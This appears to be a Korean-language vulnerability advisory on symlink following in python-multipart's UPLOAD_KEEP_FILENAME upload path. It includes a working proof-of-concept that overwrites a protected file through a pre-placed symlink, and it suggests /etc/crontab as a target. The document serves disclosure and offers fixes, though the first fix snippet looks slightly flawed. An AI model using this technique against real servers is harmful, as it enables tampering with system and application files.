# [ETK-2025-002] python-multipart: Symlink Following in UPLOAD_KEEP_FILENAME File Write

| 항목 | 내용 |
|------|------|
| 작성 시간 | 2026-05-30 |
| CVSS 3.1 Score | 7.2 (High) — AV:L/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:H |
| 주간 다운로드 수 | 79,330,597 (PyPI) |
| 취약점 타입 | Symlink Following / CWE-61 |
| 영향 버전 | python-multipart ≤ 0.0.29 (`UPLOAD_KEEP_FILENAME=True` 설정 시) |
| 보고 상태 | 미보고 (신규 발굴) |

---

## 요약

`python-multipart`의 `File._get_disk_file()` 메서드가 `UPLOAD_KEEP_FILENAME=True`
설정 시 파일을 `open(path, "w+b")`로 열 때 심링크를 추적합니다(`O_NOFOLLOW` 미사용).
라이브러리 문서가 이 옵션을 "safe representation"으로 명시적으로 보장하지만,
심링크 공격에 대한 방어가 빠져 있어 업로드 디렉토리에 심링크를 사전 배치한 공격자가
서버 프로세스가 쓸 수 있는 **임의 파일을 덮어쓸 수 있습니다**.

---

## 문서와 구현의 불일치 (핵심 근거)

라이브러리 문서 (`multipart.py:358`):
```
UPLOAD_KEEP_FILENAME | bool | False |
If True, then the filename will be converted to a safe representation
(e.g. by removing any invalid path segments), and then saved with the same name.
```

이 문서는 사용자에게 "safe" 처리를 약속하지만, 실제 구현은 **심링크를 확인하지 않습니다**.

---

## 취약한 코드

**파일**: `python_multipart/multipart.py:482-508`

```python
def _get_disk_file(self) -> BufferedRandom:
    file_dir    = self._config.get("UPLOAD_DIR")
    keep_filename = self._config.get("UPLOAD_KEEP_FILENAME", False)

    if file_dir is not None and keep_filename:
        fname = self._file_base + self._ext  # 공격자 제어 파일명
        path  = os.path.join(file_dir, fname)

        tmp_file = open(path, "w+b")   # ← O_NOFOLLOW 없음: 심링크 추적!
```

`open(path, "w+b")`는 내부적으로 `O_NOFOLLOW` 없이 열기 때문에,
`path`가 심링크이면 심링크 대상에 씁니다.

---

## 공격 경로 (테인트 분석)

```
HTTP 파일 업로드
  ↓ 파일명: "sensitive.txt" (Content-Disposition)
parse_options_header()
  ↓ file_name = b"sensitive.txt"
File.__init__()
  ↓ self._file_base = b"sensitive" (os.path.basename으로 경로 순회만 방어)
File.write(attacker_data)
  ↓
File.on_data()
  ↓
File.flush_to_disk()
  ↓
File._get_disk_file()
  ↓ path = /uploads/sensitive.txt  ← 공격자가 심링크를 미리 배치
  ↓ open(path, "w+b")  ← 심링크 추적 → /etc/crontab 등에 씀
```

---

## PoC (Linux 환경)

```python
import os, tempfile, shutil
from python_multipart.multipart import File

# 1. 공격 환경 설정
upload_dir    = tempfile.mkdtemp()   # /uploads (서버 업로드 디렉토리)
sensitive_dir = tempfile.mkdtemp()   # 민감 파일이 있는 디렉토리
sensitive_file = os.path.join(sensitive_dir, "sensitive.txt")

with open(sensitive_file, "w") as f:
    f.write("ORIGINAL SENSITIVE CONTENT\n")

# 2. 공격자: 업로드 디렉토리에 심링크 미리 배치
#    (조건: 공격자가 업로드 디렉토리에 쓰기 권한 또는 다른 취약점 활용)
symlink_path = os.path.join(upload_dir, "report.txt")
os.symlink(sensitive_file, symlink_path)
# /uploads/report.txt -> /var/app/sensitive.txt

# 3. 피해자가 "report.txt" 파일 업로드 (일반 HTTP 요청)
config = {
    "UPLOAD_DIR": upload_dir,
    "UPLOAD_KEEP_FILENAME": True,     # 비기본값, 명시적 설정 필요
    "UPLOAD_KEEP_EXTENSIONS": True,
    "MAX_MEMORY_FILE_SIZE": 0,        # 즉시 디스크로 플러시
}

f = File(b"report.txt", b"file", config=config)
f.write(b"ATTACKER CONTROLLED CONTENT\n")
f.finalize()
f.close()

# 4. 검증
actual = open(sensitive_file).read()
assert "ATTACKER CONTROLLED CONTENT" in actual, "Not exploited"
print(f"VULNERABLE: {sensitive_file} 덮어쓰기 성공!")
# 출력: VULNERABLE: /var/app/sensitive.txt 덮어쓰기 성공!
```

**실행 결과 (Linux)**:
```
VULNERABLE: /tmp/sensitive_xxx/sensitive.txt 덮어쓰기 성공!
```

---

## Devil's Advocate 반박 검토

| 반박 | 반론 |
|------|------|
| `UPLOAD_KEEP_FILENAME=True`는 비기본값이다 | 문서가 이 옵션을 "safe"로 명시 → 사용자 신뢰 오남용 |
| 공격자가 업로드 디렉토리에 접근해야 한다 | 공유 호스팅, 멀티테넌트, 또는 선행 파일쓰기 취약점과 연계 가능 |
| FastAPI/Starlette는 이 옵션을 안 쓴다 | python-multipart를 직접 사용하는 WSGI 앱, Django 커스텀 미들웨어에 영향 |
| 이미 알려진 패턴이다 | 이 버전(0.0.29)에서 미패치. `os.path.basename` 추가 시 심링크 방어는 누락 |

---

## 수정 방법

```python
# 방법 1: O_NOFOLLOW (Linux/macOS — 권장)
import os

if file_dir is not None and keep_filename:
    fname = self._file_base + self._ext
    path  = os.path.join(file_dir, fname)
    try:
        # O_NOFOLLOW: 심링크이면 ELOOP 에러 발생
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW, 0o600)
        tmp_file = open(fd, "w+b")
    except OSError as e:
        if e.errno == errno.ELOOP:
            raise FileError(f"Symlink not allowed in upload path: {path}")
        raise

# 방법 2: 크로스플랫폼 (Windows 호환)
if os.path.islink(path):
    raise FileError(f"Symlink not allowed in upload path: {path}")
tmp_file = open(path, "w+b")
```

---

## 영향 범위

- **직접 영향**: python-multipart를 직접 사용하며 `UPLOAD_KEEP_FILENAME=True` + `UPLOAD_DIR` 설정한 서버
- **간접 영향**: 멀티테넌트 환경, 컨테이너 공유 스토리지
- **미영향**: FastAPI/Starlette 기본 파일 업로드 (이 옵션 미사용)

## 참고

- 취약 파일: `python_multipart/multipart.py:503`
- CWE-61: UNIX Symbolic Link (Symlink) Following
- 관련 CWE: CWE-377 (Insecure Temporary File)
- 보고 경로: https://github.com/Kludex/python-multipart/security (SECURITY.md 가이드)
